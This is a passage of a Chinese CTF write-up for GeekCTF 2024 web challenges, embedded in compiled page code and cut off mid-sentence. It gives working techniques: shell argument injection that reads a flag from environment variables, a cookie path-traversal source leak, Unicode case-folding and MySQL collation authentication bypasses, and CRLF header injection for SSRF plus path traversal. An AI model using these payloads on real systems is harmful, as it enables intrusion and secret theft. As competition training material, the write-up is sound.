MOV        uVar6[0],qword ptr [RBP + local_160]\n            a8 fe ff ff\n                        0,5 swap\n001013e6 88 45 c5        MOV        byte ptr [RBP + local_48[5]],uVar6[0]\n001013e9 0f b6 45 c1     MOVZX      uVar6[0],byte ptr [RBP + local_48[1]]\n001013ed 0f b6 c0        MOVZX      uVar6[0],uVar6[0]\n001013f0 48 89 85        MOV        qword ptr [RBP + local_158],uVar6[0]\n            b0 fe ff ff\n001013f7 0f b6 45 c7     MOVZX      uVar6[0],byte ptr [RBP + local_48[7]]\n001013fb 88 45 c1        MOV        byte ptr [RBP + local_48[1]],uVar6[0]\n001013fe 48 8b 85        MOV        uVar6[0],qword ptr [RBP + local_158]\n            b0 fe ff ff\n00101405 88 45 c7        MOV        byte ptr [RBP + local_48[7]],uVar6[0]\n00101408 0f b6 45 c2     MOVZX      uVar6[0],byte ptr [RBP + local_48[2]]\n0010140c 0f b6 c0        MOVZX      uVar6[0],uVar6[0]\n0010140f 48 89 85        MOV        qword ptr [RBP + local_150],uVar6[0]\n            b8 fe ff ff\n00101416 0f b6 45 c6     MOVZX      uVar6[0],byte ptr [RBP + local_48[6]]\n0010141a 88 45 c2        MOV        byte ptr [RBP + local_48[2]],uVar6[0]\n0010141d 48 8b 85        MOV        uVar6[0],qword ptr [RBP + local_150]\n            b8 fe ff ff\n00101424 88 45 c6        MOV        byte ptr [RBP + local_48[6]],uVar6[0]\n00101427 c7 85 84        MOV        dword ptr [RBP + local_184],0x0\n            fe ff ff \n            00 00 00 00\n\n"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["web\u51fa\u9898\u4ebawriteup: ",(0,s.jsx)(n.a,{href:"https://www.ff98sha.me/archives/543",children:"https://www.ff98sha.me/archives/543"}),"\uff0c",(0,s.jsx)(n.a,{href:"https://blog.hans362.cn/post/sjtu-ctf-geekctf-2024-writeup/",children:"https://blog.hans362.cn/post/sjtu-ctf-geekctf-2024-writeup/"}),"\n\u8bc4\u4ef7\u4e3aCVE\u8c03\u7814/\u4fe1\u606f\u83b7\u53d6\u80fd\u529b\u592a\u5dee\uff0cWordpress\u9898\uff0cNextGPT\u9898\u90fd\u662f\u5f88\u660e\u663e\u7684\u5df2\u77e5CVE\uff0c\u4f46\u662f\u6ca1\u67e5\u51fa\u6765"]}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"web---yajf",children:"web - YAJF"}),"\n",(0,s.jsx)(n.p,{children:"\u770b\u8d77\u6765\u662fweb\u9898\uff0c\u5b9e\u9645\u4e0a\u662fbash shell escape\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u524d\u7aef\u754c\u9762\u7ed9\u4e86\u4e00\u4e2a\u53ef\u4ee5prettify json\u7684\u5c0f\u7a0b\u5e8f\uff0c\u9898\u5e72\u8bf4\u660e\u4e86\u662f",(0,s.jsx)(n.code,{children:"jq"}),"\u3002\u7f51\u7ad9\u7684API\u975e\u5e38\u7b80\u5355\u7c97\u66b4\uff0c\u53ef\u4ee5\u7528json\u53c2\u6570\u4f20\u4e00\u4e2ajson\u6587\u4ef6\uff0c\u7136\u540e\u53ef\u4ee5\u7528\u5f88\u591a\u4e2a",(0,s.jsx)(n.code,{children:"args"}),"\u53c2\u6570\u4f20",(0,s.jsx)(n.code,{children:"jq"}),"\u7684\u547d\u4ee4\u884c\u53c2\u6570\u3002json\u6587\u4ef6\u672c\u8eab\u4f30\u8ba1\u4f1a\u88ab\u5199\u5165\u6587\u4ef6\uff0c\u5229\u7528\u53ef\u80fd\u4e0d\u5927\u4e86\uff1b\u4f46\u547d\u4ee4\u884c\u53c2\u6570\u53ef\u662f\u5b9e\u6253\u5b9e\u4f1a\u88ab\u4f20\u8fdbshell\u91cc\uff0c\u5e76\u4e14\u4ee5\u7a7a\u683c\u5206\u9694\uff0c\u6240\u4ee5\u8fc7\u6ee4\u4e0d\u4e25\u5341\u6709\u516b\u4e5d\u4f1aRCE\u3002\u8fd9\u91cc\u63d0\u4e2a\u5c0f\u7ec6\u8282\uff0c\u56e0\u4e3a\u6b64\u9898\u9700\u8981\u4f20\u591a\u4e2a\u76f8\u540ckey\u7684dict\uff0c\u6211\u4eec\u53ef\u4ee5\u7528werkzeug\u5b89\u88c5\u65f6\u9644\u5e26\u7684multidict\u6a21\u5757\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u51e0\u4e2a\u7279\u5f81\u3002"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"args\u6700\u5927\u957f\u5ea6\u4e3a5\uff0c\u9664\u6b64\u5916\u6ca1\u53d1\u73b0WAF"}),"\n",(0,s.jsx)(n.li,{children:"\u8f93\u51fa\u5fc5\u987b\u662f\u5408\u6cd5\u7684JSON\u683c\u5f0f\uff0c\u5426\u5219\u4e0d\u4f1a\u8fd4\u56de"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\u6211\u4eec\u7528",(0,s.jsx)(n.code,{children:";"}),"\u628a\u547d\u4ee4\u622a\u65ad\u3002\u7136\u540e\uff0c\u56e0\u4e3a\u9898\u5e72\u7ed9\u51faflag\u5728\u73af\u5883\u53d8\u91cf\u91cc\uff0c\u6211\u4eec\u9996\u5148\u60f3\u5230",(0,s.jsx)(n.code,{children:"env | grep flag"}),"\u53ef\u4ee5\u8f93\u51faflag\u5185\u5bb9\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u628a\u5b83\u5f04\u6210\u4e00\u4e2a\u5408\u6cd5json\u3002\u5176\u5b9e\u662f\u8981\u89e3\u51b3\u4e24\u4ef6\u4e8b\uff1a"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["grep\u672c\u8eab\u4f1a\u591a\u8f93\u51fa\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u4e0d\u8fc7\u5982\u679c\u7528",(0,s.jsx)(n.code,{children:"$()"}),"\u5305\u8d77\u6765\u5c31\u6ca1\u4e8b\u4e86\uff0c",(0,s.jsx)(n.code,{children:"echo -n $( env | grep flag )"})]}),"\n",(0,s.jsxs)(n.li,{children:["\u8865\u4e00\u4e2a\u5b57\u7b26\u4e32\u5934\u5c3e\uff0c\u8fd9\u4e2a\u7b80\u5355\uff1a",(0,s.jsx)(n.code,{children:'echo -n [\\";'}),"\uff0c",(0,s.jsx)(n.code,{children:'echo -n \\"];'})]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u6837\u6700\u7ec8\u4f1a\u8f93\u51fa\uff1a",(0,s.jsx)(n.code,{children:'["FLAG=flag{rC3_1S_5o_eEEe@sY_hHhhHHH}"]'}),"\uff0c\u7ed3\u675f\u3002\u4e0d\u8fc7\u611f\u89c9\u8fd8\u662f\u4e0d\u591f\u52b2\u554a\uff0c\u5982\u679cFLAG\u91cc\u9762\u6765\u70b9\u5f15\u53f7\u62ec\u53f7\u5565\u7684\u4f30\u8ba1\u80fd\u66f4\u597d\u73a9\u4e00\u70b9\uff08"]}),"\n",(0,s.jsx)(n.h2,{id:"web---secrets",children:"web - secrets"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u6211\u4e5f\u5f88\u559c\u6b22\uff0c\u867d\u7136\u5206\u4e86\u4e09\u4e2a\u9636\u6bb5\uff0c\u4f46\u540e\u4e24\u4e2a\u9636\u6bb5\u5176\u5b9e\u90fd\u5728\u8bb2\u4e00\u4e2a\u4e8b\u60c5\uff1a\u5f53",(0,s.jsx)(n.code,{children:"upper/lower"}),"\u5b57\u7b26\u4e32\u8f6c\u6362\u9047\u5230\u975e\u6807\u51c6\u5b57\u7b26\u96c6\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"1-\u6e90\u7801\u6cc4\u9732",children:"1. \u6e90\u7801\u6cc4\u9732"}),"\n",(0,s.jsx)(n.p,{children:"\u5f53\u7136\u9996\u5148\u6211\u5c31\u88ab\u4e00\u4e2a\u767b\u9646\u9875\u9762\u7ed9\u62e6\u4f4f\u4e86\uff0c\u5c1d\u8bd5\u4e86\u4e00\u4e9bSQL\u6ce8\u5165\u81ea\u7136\u6ca1\u4ec0\u4e48\u7ed3\u679c\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u9875\u9762\u6709\u4e9b\u5f88\u5947\u602a\u7684\u70b9\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u6709\u4e00\u4e2aselectbox\u53ef\u4ee5\u8bbe\u7f6e\u4e3b\u9898\uff0c\u5207\u6362\u4e0d\u540c\u7684CSS\u3002\u4e0d\u8fc7\u8fd9\u9898\u8bbe\u7f6e\u4e3b\u9898\u7684\u65b9\u5f0f\u6709\u70b9\u7279\u522b\uff0c\u4f1a\u8bbe\u7f6e\u4e00\u4e2a\u7c7b\u4f3c",(0,s.jsx)(n.code,{children:"assets=assets/css/pico.violet.min.css"}),"\u7684cookie\uff0c\u7136\u540e\u901a\u8fc7",(0,s.jsx)(n.code,{children:"/redirectCustomAsset"}),"\u7684endpoint\u83b7\u5f97CSS\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:["\u7f51\u7ad9\u4e0a\u6709\u4e24\u4e2ahint\uff0c\u4e00\u4e2a\u662fHTML\u7684\u6ce8\u91ca\uff0c\u6709\u4e00\u5806\u4e71\u7801\uff0c\u53ef\u4ee5\u7528Base85\u89e3\u7801\uff0c\u5f97\u5230\u7684\u662f\u7f51\u7ad9\u7684\u76ee\u5f55\u7ed3\u6784\u3002\u8fd8\u6709\u4e00\u4e2a\u662f\u7f51\u9875\u7aef\u63a7\u5236\u53f0\u4f1a\u8f93\u51fa\u4e00\u4e2a\u6570\u5b57\u5217\u8868\uff0c\u53ef\u4ee5\u770b\u51fa\u662f\u5728",(0,s.jsx)(n.code,{children:"color-picker.js"}),"\u5f00\u5934\u7528",(0,s.jsx)(n.code,{children:"console.log"}),"\u786c\u7f16\u7801\u8f93\u51fa\u7684\uff0c\u5f88\u660e\u663e\u662f\u4e9b\u4fe1\u606f\u3002\u4e00\u5f00\u59cb\u6211\u6ca1\u770b\u51fa\u6765\uff0c\u95ee\u4e86Claude\u624d\u610f\u8bc6\u5230\u8fd9\u4e9b\u6570\u5b57\u91cc\u53ea\u5305\u542b0-7\uff0c\u6240\u4ee5\u7528\u516b\u8fdb\u5236\u89e3\u7801\uff0c\u5f97\u5230\u4e00\u53e5\u8bdd\uff1a",(0,s.jsx)(n.code,{children:"Don't you think the color picker is weird?"})]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u54ce\u5440\u6211\u5f53\u7136\u77e5\u9053\u8fd9\u4e2aCSS\u6709\u70b9\u5947\u602a\u3002\u4e00\u9635fuzz\u540e\u6211\u53d1\u73b0\uff0c\u628a",(0,s.jsx)(n.code,{children:"assets"}),"cookie\u8bbe\u7f6e\u4e3a",(0,s.jsx)(n.code,{children:"assets/css/../css/pico.violet.min.css"}),"\u65f6\uff0c\u80fd\u6b63\u5e38\u8bbe\u7f6e\uff1b\u4f46",(0,s.jsx)(n.code,{children:"assets/../css/pico.violet.min.css"}),"\uff0c\u770b\u6765\u8fd9\u4e2aCSS\u662f\u7b80\u5355\u7684\u524d\u7f00\u5339\u914d\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002\u901a\u8fc7\u4e4b\u524dBase85\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u6240\u6709\u7684\u6e90\u7801\u6587\u4ef6\uff0c\u6b63\u5f0f\u8fdb\u5165\u7b2c\u4e8c\u9636\u6bb5\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"2-normal-user-loginpython-unicode-upper-lower-degeneracy",children:"2. Normal User login\uff1aPython Unicode .upper .lower degeneracy"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4e00\u5f00\u59cb\u5728\u6e90\u7801\u91cc\u627e\u5230\u4e86\u666e\u901a\u7528\u6237\u7684\u660e\u6587\u767b\u5f55\u8d26\u53f7\u5bc6\u7801\u8fd8\u633a\u9ad8\u5174\uff0c\u4f46\u53d1\u73b0\u767b\u4e0d\u8fdb\u53bb\u3002\u4ed4\u7ec6\u4e00\u770b\u624d\u53d1\u73b0\uff0c\u8fd9\u4e2a\u5bc6\u7801\u9a8c\u8bc1\u7b97\u6cd5\u597d\u50cf\u6709\u70b9\u7279\u522b\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'def isEqual(a, b):\n    return a.lower() != b.lower() and a.upper() == b.upper()\n\nif isEqual(username, "alice") and isEqual(password, "start2024"):\n    session["logged_in"] = True\n    session["role"] = "user"\n    return redirect("/")\nelif username == "admin" and password == os.urandom(128).hex():\n    session["logged_in"] = True\n    session["role"] = "admin"\n    return redirect("/")\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u597d\u5bb6\u4f19\uff0c\u5c0f\u5199\u4e0d\u76f8\u7b49\uff0c\u5927\u5199\u76f8\u7b49\uff1f\u8fd9\u4e2a\u8bbe\u8ba1\u5e94\u8be5\u662f\u672c\u6765\u4e3a\u4e86\u65b9\u4fbf\u5176\u4ed6\u62c9\u4e01\u8bed\u79cd\u7528\u6237\u4f7f\u7528\u5927\u5c0f\u5199\u529f\u80fd\u7684\uff0c\u4f46\u662f\u786e\u5b9e\u4f1a\u9020\u6210\u4e00\u4e9b\u610f\u60f3\u4e0d\u5230\u7684\u7ed5\u8fc7\u73b0\u8c61\u7684\uff0c\u542c\u8bf4\u8fc7Javascript\u90a3\u8fb9\u786e\u5b9e\u6709\u7528\u8fd9\u79cd\u73b0\u8c61\u653b\u51fb\u7684\u6848\u4f8b\uff0c\u6ca1\u60f3\u5230Python\u4e5f\u6709\u3002\n\u4e8e\u662f\uff0c\u7b80\u5355\u5199\u4e86\u4e2aPython\u4ee3\u7801\uff0c\u904d\u5386\u6240\u6709Unicode\u5b57\u7b26\uff0c\u770b\u770b\u54ea\u4e9b\u51fa\u73b0\u4e86\u8fd9\u79cd\u60c5\u51b5"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"def isEqual(a:str, b:str):\n    return a.lower() != b.lower() and a.upper() == b.upper()\n\nfor c in range(0x10ffff):\n    if any([isEqual(chr(c), al) for al in [chr(0x61 + i) for i in range(26)]]):\n        print(c, chr(c), [al for al in [chr(0x61 + i) for i in range(26)] if isEqual(chr(c), al)][0])\n'''\n305 \u0131 i\n383 \u017f s\n'''\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5f88\u795e\u5947\u554a\uff0c\u4e0d\u6b62\u6709\uff0c\u8fd8\u6709\u4e24\u4e2a\uff0c\u521a\u597d\u7528\u6765bypass\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u5173\u4e8e\u524d\u8005\uff0c\u6211\u8fd8\u770b\u5230\u4e86",(0,s.jsx)(n.a,{href:"https://stackoverflow.com/questions/19030948/python-utf-8-lowercase-turkish-specific-letter",children:"stackoverflow"}),"\u6709\u571f\u8033\u5176\u4eba\u5410\u69fd\u4e3a\u4ec0\u4e48Python2.7\u7684",(0,s.jsx)(n.code,{children:"tolower"}),"\u4e0d\u80fd\u8fd4\u56de\u571f\u8033\u5176\u6587\u5b57\u4e2d\u7684",(0,s.jsx)(n.code,{children:"\u0131"}),"\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"3-admin-user-login-sql-unicode-ci",children:"3. Admin User Login: SQL Unicode CI"}),"\n",(0,s.jsxs)(n.p,{children:["\u7b2c\u4e09\u9636\u6bb5\u662f\u767b\u5f55\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"type"}),"URL\u53c2\u6570\uff0c\u901a\u8fc7SQLAlchemy\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u5185\u5bb9\u3002\u6211\u4eec\u7684flag\u5728\u540d\u4e3a",(0,s.jsx)(n.code,{children:"secrets"}),"\u7684\u884c\u4e2d\uff0c\u4f46\u5982\u679c\u524d\u7aefflask\u4f1a\u68c0\u67e5",(0,s.jsx)(n.code,{children:"type"}),"\u5728Python\u4e2dlower\u6216upper\u4e4b\u540e\u8fd4\u56de\u4e86",(0,s.jsx)(n.code,{children:"secrets"}),"\uff0c\u5c31\u4e0d\u4f1a\u50cf\u6570\u636e\u5e93\u8bf7\u6c42\u800c\u662f\u8fd4\u56de\u4e00\u4e2a\u62a5\u9519\u9875\u9762\u3002\u8fd9\u4e2a\u62a5\u9519\u9875\u9762\u957f\u8fd9\u6837\uff1a",(0,s.jsx)(n.code,{children:"You are not admin. Only admin can view secre<u>ts</u>"}),"\uff0c\u5f88\u8bb2\u7a76\u554a\uff0c\u7528\u4e00\u4e2a\u4e0b\u5212\u7ebf\u628a\u6700\u540e\u4e24\u4e2a\u5b57\u6bcd",(0,s.jsx)(n.code,{children:"ts"}),"\u7ed9\u6807\u51fa\u6765\u4e86\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u6e90\u7801\u7ed9\u51fa\u4e86\u6570\u636e\u5e93\u7684\u7f16\u7801\u683c\u5f0f\u4e3a",(0,s.jsx)(n.code,{children:"utf8mb4"}),", \u8fd8\u6709\u4e00\u4e2a\u6392\u5e8f\u89c4\u5219\uff08collation\uff09\u4e3a",(0,s.jsx)(n.code,{children:"utf8mb4_unicode_ci"}),"\u3002\u67e5\u4e86",(0,s.jsx)(n.a,{href:"https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html",children:"MySQL\u7684\u6587\u6863"}),"\uff0c\u5176\u5b9e",(0,s.jsx)(n.code,{children:"utf8mb4"}),"\u5c31\u662f\u6700\u5927\u56db\u5b57\u8282\u7684UTF8\uff0c\u5c31\u662f\u4e00\u822c\u610f\u4e49\u4e0b\u7684UTF8\uff08\u548cPython\u4e00\u6837\u7684\uff09\u3002\u800c",(0,s.jsx)(n.code,{children:"_unicode_ci"}),"\u5219\u6bd4\u8f83\u6709\u8da3\uff0c\u5b83\u4e3b\u8981\u662f\u4e3a\u4e86\u8ba9\u5176\u4ed6\u8bed\u8a00\u7684\u975e\u6807\u51c6\u5b57\u7b26\u5728\u6392\u5e8f\u6bd4\u8f83\u65f6\u80fd\u548c\u76f8\u4f3c\u7684\u6807\u51c6\u5b57\u7b26\u6709\u76f8\u540c\u7684\u5730\u4f4d\uff0c\u6bd4\u5982\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"\xc4 = A\n\xd6 = O\n\xdc = U\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4f46\u6709\u4e2a\u7279\u522b\u6709\u610f\u601d\u7684\u6848\u4f8b\uff0c\u5c31\u662f\u4e00\u4e2a\u7279\u6b8a\u5b57\u7b26\u53ef\u80fd\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2a\u6807\u51c6\u5b57\u7b26\uff0c\u6bd4\u5982\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"\xdf = ss\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0e\u672c\u9898\u65e0\u5173\uff0c\u4e0d\u8fc7\u5982\u679c\u4e0d\u662f",(0,s.jsx)(n.code,{children:"_unicode_ci"}),"\u53ef\u80fd\u4f1a\u6269\u5c55\u4e00\u4e9b\u8fd9\u6837\u7684\u89c4\u5219\uff0c\u6bd4\u5982\u5fb7\u8bed\u7684",(0,s.jsx)(n.code,{children:"utf8mb4_german2_ci"}),"\u6392\u5e8f\u89c4\u5219\u4e0b\u6709\u8fd9\u4e9b\u89c4\u5219\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"\xc4 = \xc6 = AE\n\xd6 = \u0152 = OE\n\xdc = UE\n\xdf = ss\n"})}),"\n",(0,s.jsx)(n.p,{children:"\uff08\u60f3\u5230\u4e00\u4e9b\u56fd\u4ea7\u8f6f\u4ef6\u91cc\u9762\uff0c\u4f1a\u628a\u6c49\u5b57\u6309\u62fc\u97f3\u548c\u82f1\u6587\u4e00\u8d77\u6392\u5e8f\uff0c\u662f\u4e0d\u662f\u4e5f\u662f\u76f8\u540c\u7684\u539f\u7406\u5462\uff1f\uff09"}),"\n",(0,s.jsxs)(n.p,{children:["\u8054\u60f3\u5230\u521a\u624d\u6709\u4e2a\u88ab\u5212\u51fa\u6765\u7684\u63d0\u793a\uff0c\u6709\u6ca1\u6709\u4ec0\u4e48\u5b57\u7b26\u7b49\u6548\u4e8e",(0,s.jsx)(n.code,{children:"ts"}),"\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u53bb",(0,s.jsx)(n.a,{href:"https://www.unicode.org/Public/UCA/4.0.0/allkeys-4.0.0.txt",children:"Unicode\u5b98\u65b9"}),"\u7684\u6587\u4ef6\u4e2d\u627e\u4e00\u627e\uff0c\u7ed3\u679c\u771f\u7684\u6709\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"02A6  ; [.1002.0020.0004.02A6][.0FEA.0020.0004.02A6] # LATIN SMALL LETTER TS DIGRAPH; QQKN\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728Python\u4e2d\uff0c",(0,s.jsx)(n.code,{children:"chr(0x2a6)"}),"\u4f1a\u8fd4\u56de",(0,s.jsx)(n.code,{children:"\u02a6"}),"\uff0c\u786e\u5b9e\u770b\u7740\u50cfts\u4e24\u4e2a\u5b57\u7b26\u62fc\u8d77\u6765\u3002\u8fd9\u4e2a\u5b57\u7b26\u53ef\u4ee5\u6210\u529f\u8fbe\u6210\u5728Python\u91cc\u662f\u4e00\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f\u5728SQL\u662f\u4e24\u4e2a\u5b57\u7b26\u7684\u5947\u666f\uff0c\u4e8e\u662f\u6211\u4eec\u4f20",(0,s.jsx)(n.code,{children:"?type=secre\u02a6"}),"\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u987a\u4fbf\u4e00\u63d0\uff0c\u5982\u679c\u4f60\u5728\u6d4f\u89c8\u5668\u91cc\u7528Ctrl+F\u641c\u7d22\u529f\u80fd\u641c\u7d22",(0,s.jsx)(n.code,{children:"\u02a6"}),"\u8fd9\u4e2a\u5b57\uff0c\u4f60\u4f1a\u53d1\u73b0\u6240\u6709",(0,s.jsx)(n.code,{children:"ts"}),"\u4e5f\u80fd\u88ab\u641c\u51fa\u6765\u3002\u8fd9\u4e2a\u73b0\u8c61\u5927\u5927\u51b2\u51fb\u4e86\u6211\u7684\u8ba4\u77e5\uff1a\u5728\u6570\u636e\u5e93\u7684\u4e16\u754c\u91cc\uff0c\u6216\u8bb8",(0,s.jsx)(n.code,{children:"\u02a6"}),"\u548c",(0,s.jsx)(n.code,{children:"ts"}),"\u672c\u5c31\u662f\u540c\u6837\u7684\u4e1c\u897f\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"flag{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1}"})}),"\n",(0,s.jsx)(n.h2,{id:"web---picbed",children:"web - picbed"}),"\n",(0,s.jsx)(n.p,{children:"\u6700\u559c\u6b22\u4e5f\u82b1\u4e86\u6700\u591a\u7cbe\u529b\uff0c\u867d\u7136\u5f88\u591a\u7cbe\u529b\u5176\u5b9e\u548c\u672c\u9898\u65e0\u5173\u5c31\u662f\u4e86\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u662f\u5728GO\u5f00\u6e90\u9879\u76ee",(0,s.jsx)(n.code,{children:"webp_server_go"}),"\u57fa\u7840\u4e0a\u5305\u4e86\u4e00\u4e2aFlask\u524d\u7aef\uff0c\u53ef\u4ee5\u4e0a\u4f20\u56fe\u7247\u5e76\u4ee5webp\u683c\u5f0f\u8fd4\u56de\u3002\u9996\u5148\u5ba1\u8ba1\u4e00\u4e0bFlask\u6e90\u7801"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u4e0a\u4f20\u63a5\u53e3",(0,s.jsx)(n.code,{children:"/upload"}),"\uff0c\u9700\u8981\u6587\u4ef6\u540d\u7684\u6269\u5c55\u540d\u4e3a\u5b57\u6bcd\u6216\u6570\u5b57\uff0c\u7136\u540e\u4ee5",(0,s.jsx)(n.code,{children:'f"pics/{os.urandom(8).hex()}.{ext}"'}),"\u5b58\u50a8\u5728\u670d\u52a1\u5668\u4e0a\u3002\uff08\u5de5\u4f5c\u76ee\u5f55\u4e3a",(0,s.jsx)(n.code,{children:"/opt"}),"\uff09\u3002\u8fd9\u4e2arandom hash\u6587\u4ef6\u540d\u9632\u6b62\u4e86\u4e0a\u4f20\u8def\u5f84\u7a7f\u8d8a\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:["\u83b7\u53d6\u56fe\u7247\u63a5\u53e3",(0,s.jsx)(n.code,{children:"/pics/<filename>"}),"\uff0c\u9996\u5148\u786e\u4fdd\u8bf7\u6c42\u7684\u6587\u4ef6\u5b58\u5728\u4e8e\u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e\u4f1a\u5411\u540e\u7aef\u7684",(0,s.jsx)(n.code,{children:"webp_server_go"}),"\u521b\u5efa\u4e00\u4e2asocket\u53d1\u9001HTTP\u8bf7\u6c42\u3002\u6211\u4eec\u53ef\u4ee5\u5e26\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"Accept"}),"\u8bf7\u6c42\u5934\uff0cFlask\u4f1a\u5bf9\u8bf7\u6c42\u5934\u8fdb\u884c",(0,s.jsx)(n.code,{children:"urlparse.unquote_plus"}),"\u4e4b\u540e\u5d4c\u5165\u5728\u5bf9\u540e\u53f0\u7684\u8bf7\u6c42\u91cc\u3002\u4f46\u8fd9\u4e2a\u5904\u7406\u5b9e\u9645\u4e0a\u5f88\u7cdf\u7cd5\uff0c\u56e0\u4e3a\u6211\u53ea\u8981\u5e26\u4e0a",(0,s.jsx)(n.code,{children:"%0D%0A"}),"\u6362\u884c\u540e\u8bf7\u6c42\u5934\u5c31\u4e0d\u518d\u662f\u8bf7\u6c42\u5934\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u628aHTTP\u62a5\u6587\u622a\u65ad\u5e76\u53d1\u9001\u4efb\u610f\u5185\u5bb9\uff0c\u800c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u53ea\u662f\u6700\u540e\u4e00\u4e2aHTTP\u62a5\u6587\u7684\u5185\u5bb9\u3002\u8fd9\u5b9e\u9645\u4e0a\u8fbe\u6210\u4e86\u5bf9\u540e\u53f0",(0,s.jsx)(n.code,{children:"webp_server_go"}),"\u7684SSRF\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"/flag.png"}),"\u4f4d\u4e8e\u6839\u76ee\u5f55\uff0c\u5de5\u4f5c\u76ee\u5f55\u4e4b\u5916\uff0c\u6240\u4ee5\u8bfb\u5230\u5b83\u9700\u8981\u4e2a\u76ee\u5f55\u7a7f\u8d8a\u3002"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u56e0\u4e3a\u6709SSRF\uff0c\u6240\u4ee5\u6211\u4eec\u91cd\u70b9\u5c31\u5728\u540e\u9762\u7684webp_serverp_go\u4e0a\u4e86\uff0cfuzzing\u8fc7\u7a0b\u4e2d\uff0c\u867d\u7136\u53d1\u73b0\u6709\u4e9b\u60c5\u51b5\u4e0b\u4f1acrash\u6389\uff0c\u7528",(0,s.jsx)(n.code,{children:"%2e%2e"}),"\u4f1a\u8ba9logger\u51fa\u73b0\u6ca1\u6709normalize\u6389\u7684",(0,s.jsx)(n.code,{children:".."}),"\uff0c\u4f46\u603b\u4f53\u6ca1\u53d1\u73b0\u4ec0\u4e48\u95ee\u9898\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"\u6b63\u89e3webp_server_go\u8def\u5f84\u7a7f\u8d8a-cve-2021-46104plus",children:"\u6b63\u89e3\uff1awebp_server_go\u8def\u5f84\u7a7f\u8d8a \uff08CVE-2021-46104\uff0cplus\uff09"}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbe\u5b9a\u4e0a\u8fd9\u662f\u4e00\u4e2a0.4.0\u7248\u672c\u53d1\u73b0\uff0c\u73b0\u5df2\u7ecf\u88ab\u4fee\u590d\u7684CVE\uff0c",(0,s.jsx)(n.a,{href:"https://github.com/webp-sh/webp_server_go/issues/92",children:"\u76f8\u5173issue\u6709\u8ba8\u8bba"}),"\u3002\u6700\u65e9\u7248\u672c\u4f3c\u4e4e\u6700\u7b80\u5355\u7c97\u66b4\u7684",(0,s.jsx)(n.code,{children:"%2e%2e%2f"}),"\u5c31\u80fd\u7a7f\uff0c\u540e\u6765\u4fee\u4e86\u4e00\u4e9b\u8865\u4e01\uff0c\u52a0\u5165\u4e86",(0,s.jsx)(n.code,{children:"path.Clean"}),"\u8fd9\u6837\u7684\u5904\u7406\uff0c\u6240\u4ee5\u5df2\u7ecf\u6253\u4e0d\u901a\u4e86\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4f46\u8fd9\u6b21\u53d1\u73b0\uff0c\u5728HTTP\u62a5\u6587\u4e2d\u5982\u679c\u7701\u7565\u4e86\u5f00\u5934\u7684",(0,s.jsx)(n.code,{children:"/"}),"\uff0c\u6b